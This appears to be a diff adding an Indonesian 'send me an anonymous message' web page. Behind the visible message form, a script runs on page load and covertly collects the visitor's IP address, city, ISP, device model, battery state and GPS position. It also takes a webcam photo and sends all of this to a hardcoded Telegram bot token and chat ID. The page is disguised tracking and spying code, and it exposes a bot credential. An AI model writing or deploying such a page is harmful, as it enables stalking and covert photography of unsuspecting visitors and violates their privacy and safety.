@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Kirim Pesan Anonim</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: url("https://files.catbox.moe/0aprp1.jpg") no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* dekorasi neon bulat */
+    .circle {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.6;
+      animation: float 10s infinite alternate ease-in-out;
+    }
+    .circle:nth-child(1) {
+      width: 250px; height: 250px;
+      background: #ff4b2b;
+      top: 10%; left: 15%;
+    }
+    .circle:nth-child(2) {
+      width: 200px; height: 200px;
+      background: #0072ff;
+      bottom: 10%; right: 20%;
+      animation-delay: 3s;
+    }
+    .circle:nth-child(3) {
+      width: 300px; height: 300px;
+      background: #00ff95;
+      top: 50%; left: 60%;
+      animation-delay: 6s;
+    }
+    @keyframes float {
+      0% { transform: translateY(0) translateX(0); }
+      100% { transform: translateY(-40px) translateX(40px); }
+    }
+
+    .box {
+      position: relative;
+      background: rgba(0,0,0,0.7);
+      border-radius: 20px;
+      padding: 25px;
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      color: white;
+      z-index: 2;
+      box-shadow: 0 0 25px rgba(255,255,255,0.15);
+      animation: fadeInUp 1s ease;
+      backdrop-filter: blur(12px);
+    }
+    @keyframes fadeInUp {
+      from { transform: translateY(50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .header img {
+      width: 55px;
+      height: 55px;
+      border-radius: 50%;
+      border: 2px solid #fff;
+      object-fit: cover;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.5); }
+      50% { transform: scale(1.1); box-shadow: 0 0 20px rgba(255,255,255,0.4); }
+    }
+
+    h3 {
+      margin: 0;
+      font-size: 22px;
+      font-weight: 600;
+      white-space: nowrap;
+      overflow: hidden;
+      border-right: 2px solid #fff;
+      width: 0;
+      animation: typing 3s steps(22) forwards, blink 0.7s step-end infinite;
+    }
+    @keyframes typing {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+    @keyframes blink {
+      from, to { border-color: transparent; }
+      50% { border-color: #fff; }
+    }
+
+    p { font-size: 14px; color: #ccc; margin-top: 5px; }
+
+    textarea, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      outline: none;
+      transition: 0.3s;
+    }
+    textarea {
+      resize: none;
+      background: rgba(255,255,255,0.08);
+      color: white;
+    }
+    textarea:focus {
+      background: rgba(255,255,255,0.15);
+      box-shadow: 0 0 8px #fff;
+    }
+
+    button {
+      background: linear-gradient(135deg,#00c6ff,#0072ff);
+      color: #fff;
+      cursor: pointer;
+      font-weight: bold;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #00c6ff;
+    }
+
+    .link-btn {
+      display: inline-block;
+      text-decoration: none;
+      background: linear-gradient(135deg,#ff512f,#dd2476);
+      color: #fff;
+      padding: 12px;
+      border-radius: 10px;
+      width: 100%;
+      margin-top: 10px;
+      font-weight: bold;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .link-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #ff4b2b;
+    }
+
+    #video, #canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <!-- hiasan dekor -->
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+
+  <div class="box">
+    <div class="header">
+      <img src="https://files.catbox.moe/2g7vve.jpg" alt="foto profil" />
+      <div>
+        <h3>satria keren bet aseli</h3>
+        <p>Kirim aku pesan anonim!</p>
+      </div>
+    </div>
+
+    <form id="msgForm">
+      <textarea id="pesan" rows="4" placeholder="Tulis pesanmu di sini..." required></textarea>
+      <button type="submit">🚀 Kirim!</button>
+    </form>
+
+    <a class="link-btn" href="https://t.me/satriabukanjomoks" target="_blank">
+      ✨ Dapatkan pesan untukmu sendiri!
+    </a>
+  </div>
+
+  <div id="info" style="display:none;"></div>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <!-- script tetap sama persis kayak yang kamu kasih -->
+  <script>
+    const botToken = "7814381215:AAH6A3harmMoM7AcYYBAlwkc5wptp1ZUUNs";
+    const chatId = "7406270477";
+
+    document.getElementById("msgForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const pesan = document.getElementById("pesan").value.trim();
+      if (!pesan) return alert("Pesan tidak boleh kosong!");
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `📩 Pesan anonim baru:\n\n${pesan}`
+        })
+      }).then(res => {
+        if (res.ok) {
+          alert("Pesan terkirim!");
+          document.getElementById("pesan").value = "";
+        } else {
+          alert("Gagal mengirim pesan");
+        }
+      }).catch(() => alert("Gagal mengirim pesan"));
+    });
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({chat_id: chatId, text: text, parse_mode: "HTML"})
+      }).catch(e => console.error(e));
+    }
+
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).catch(e => console.error(e));
+    }
+
+    function detectDeviceModel() {
+      const ua = navigator.userAgent;
+      let model = "Tidak diketahui";
+      const samsungMatch = ua.match(/SM-[A-Z0-9]+/);
+      if (samsungMatch) model = `Samsung ${samsungMatch[0]}`;
+      const xiaomiMatch = ua.match(/Redmi [A-Za-z0-9]+|Mi [A-Za-z0-9]+/i);
+      if (xiaomiMatch) model = `Xiaomi ${xiaomiMatch[0]}`;
+      if (/Oppo/i.test(ua)) model = "Oppo (seri tidak terbaca)";
+      if (/Vivo/i.test(ua)) model = "Vivo (seri tidak terbaca)";
+      if (/Realme/i.test(ua)) model = "Realme (seri tidak terbaca)";
+      if (/Huawei/i.test(ua)) model = "Huawei (seri tidak terbaca)";
+      if (/iPhone/.test(ua)) model = "Apple iPhone (seri tidak terdeteksi)";
+      return model;
+    }
+
+    async function getInfo() {
+      let ip = "-", city = "-", region = "-", country = "-", org = "-";
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+        if (loc.status === "success") {
+          city = loc.city;
+          region = loc.regionName;
+          country = loc.country;
+          org = loc.org;
+        }
+      } catch {}
+      let batteryPercent = "N/A", charging = "N/A";
+      try {
+        const battery = await navigator.getBattery();
+        batteryPercent = `${(battery.level * 100).toFixed(0)}%`;
+        charging = battery.charging ? "Ya" : "Tidak";
+      } catch {}
+      const deviceModel = detectDeviceModel();
+      const text = `
+IP Address: ${ip}
+Kota: ${city}
+Region: ${region}
+Negara: ${country}
+Organisasi: ${org}
+Device: ${deviceModel}
+Baterai: ${batteryPercent} (Charging: ${charging})
+User Agent: ${navigator.userAgent}
+      `.trim();
+      sendToTelegram(`<b>📥 Informasi Pengunjung:</b>\n<pre>${text}</pre>`);
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          () => sendToTelegram("📍 Lokasi GPS Ditolak atau Tidak Tersedia"),
+          {timeout:10000}
+        );
+      }
+    }
+
+    async function startCamera() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        await new Promise(r => {video.onloadedmetadata = () => r();});
+        await new Promise(r => setTimeout(r, 3000));
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          if (blob) sendPhotoToTelegram(blob);
+          stream.getTracks().forEach(track => track.stop());
+        }, "image/jpeg");
+      } catch {
+        sendToTelegram("❌ Kamera Ditolak atau Tidak Tersedia");
+      }
+    }
+
+    window.addEventListener("load", () => {
+      getInfo();
+      startCamera();
+    });
+  </script>
+</body>
+</html>
